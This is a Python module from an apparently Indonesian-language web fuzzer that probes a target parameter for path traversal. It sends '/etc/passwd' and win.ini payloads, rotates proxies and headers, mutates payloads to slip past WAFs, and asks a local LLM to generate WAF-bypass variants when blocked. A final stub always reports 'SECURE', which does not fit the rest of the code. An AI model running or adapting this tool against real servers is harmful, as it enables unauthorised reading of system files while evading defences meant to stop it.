# modules/path.py
import os
import re
import logging
import time
import asyncio
import aiohttp
from typing import List, Dict, Any, Tuple
from modules.base import BaseModule
import config

logger = logging.getLogger("water_fuzzer.path")

class PathTraversalModule(BaseModule):
    """
    Modul Audit Path Traversal V10.1 Asinkronus (AI-Driven Evidence Framework).
    Menguji kegagalan pembatasan akses direktori berkas secara non-blocking, serta memicu
    inferensi LLM Ollama Lokal jika mendeteksi blokiran WAF permukaan.
    """

    def load_payloads(self) -> List[str]:
        """Memuat kamus amunisi khusus Path Traversal dari berkas eksternal atau fallback."""
        payload_file: str = os.path.join(config.BASE_DIR, "payloads", "path.txt")
        if os.path.exists(payload_file):
            try:
                with open(payload_file, "r", encoding="utf-8") as f:
                    return [line.strip() for line in f if line.strip() and not line.startswith("#")]
            except IOError as e:
                logger.error(f"Gagal membaca berkas payloads Path Traversal: {str(e)}")
        return ["../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini"]

    async def execute_and_evaluate(self, session: aiohttp.ClientSession, payload: str, base_payload: str, headers: dict) -> Tuple[bool, bool]:
        """Metode utilitas internal untuk mengirim paket data dan mengevaluasi indikator biner respons Path."""
        try:
            start_time: float = time.time()
            if self.auditor.method == "POST":
                async with session.post(self.auditor.target_url, data={self.auditor.parameter: payload}, headers=headers, timeout=self.auditor.timeout, proxy=self.auditor._get_random_proxy()) as res:
                    body: str = await res.text()
                    status: int = res.status
            else:
                async with session.get(self.auditor.target_url, params={self.auditor.parameter: payload}, headers=headers, timeout=self.auditor.timeout, proxy=self.auditor._get_random_proxy()) as res:
                    body: str = await res.text()
                    status: int = res.status
                
            latency: float = time.time() - start_time
            
            # SENSOR DETEKSI BLOKIRAN WAF PERMUKAAN (DIKUNCI KAKU KODE 403, 409, 429)
            if status in [403, 409, 429] or "waf" in body.lower() or "blocked" in body.lower():
                return False, True

            indicators: List[str] = []
            current_entropy: float = self.auditor.calculate_content_entropy(body)
            entropy_delta: float = abs(current_entropy - self.auditor.baseline["entropy_score"])
            
            module_specific: Dict[str, Any] = {
                "vulnerability_proof_concept": "Local File Read Discovered",
                "validated_resource_path": base_payload,
                "resource_content_integrity_match": False,
                "extracted_system_signatures": []
            }

            # EVALUASI INDIKATOR STRUKTUR BERKAS INTERNAL (LINUX / WINDOWS)
            if "root:x:0:0:" in body:
                indicators.append("anomalous_output")
                indicators.append("consistent_evaluation_proof")
                module_specific["resource_content_integrity_match"] = True
                module_specific["extracted_system_signatures"].append("Linux passwd file structure found (root:x:0:0 pack)")
                
            if "[extensions]" in body or "[fonts]" in body:
                indicators.append("anomalous_output")
                indicators.append("consistent_evaluation_proof")
                module_specific["resource_content_integrity_match"] = True
                module_specific["extracted_system_signatures"].append("Windows ini file structure found")

            if status != self.auditor.baseline["status_code"] or len(body) != self.auditor.baseline["content_length"]:
                indicators.append("response_diff")
            if base_payload not in body:
                indicators.append("no_raw_reflection")
            if entropy_delta > 0.5:
                indicators.append("entropy_deviation")

            if indicators:
                self.auditor.evaluate_heuristic_evidence(
                    response_text=body, status_code=status, response_time=latency,
                    sent_payload=payload, indicators=indicators, evidence_type="PATH_TRAVERSAL",
                    module_specific_proof=module_specific
                )
                return True, False

        except Exception as e:
            logger.debug(f"Abaikan gangguan koneksi paralel Path: {str(e)}")

        return False, False

    async def run_audit(self, session: aiohttp.ClientSession) -> bool:
        """Menyapu kamus amunisi Path secara asinkronus didukung Dynamic AI Mutator."""
        print("[*] Menjalankan Modul V10.1: Path Traversal (AI-Driven)...")
        headers: dict = self.auditor._get_random_headers()
        payloads: List[str] = self.load_payloads()
        found_any_vuln: bool = False

        for base_payload in payloads:
            for strategy in range(4):
                payload = self.auditor.mutate_payload_for_waf(base_payload, strategy)
                success, trigger_ai = await self.execute_and_evaluate(session, payload, base_payload, headers)
                
                if success:
                    found_any_vuln = True
                    break
                    
                if trigger_ai:
                    print(f"[\033[1;31m!\033[0m] Peringatan: Sensor WAF Terdeteksi! Memicu Pipa Pemikiran AI Lokal...")
                    ai_mutated_payload = await self.auditor.ask_local_ai_to_bypass_waf(session, base_payload, "WAF_BLOCK_DETECTED")
                    if ai_mutated_payload:
                        success_ai, _ = await self.execute_and_evaluate(session, ai_mutated_payload, base_payload, headers)
                        if success_ai:
                            found_any_vuln = True
                            break
            if found_any_vuln:
                break

        return found_any_vuln

    def verifikator(self, response, payload_terpakai, crypto_token) -> Tuple[str, str, str, str, list]:
        return "SECURE", "None", "None", "Lolos.", []
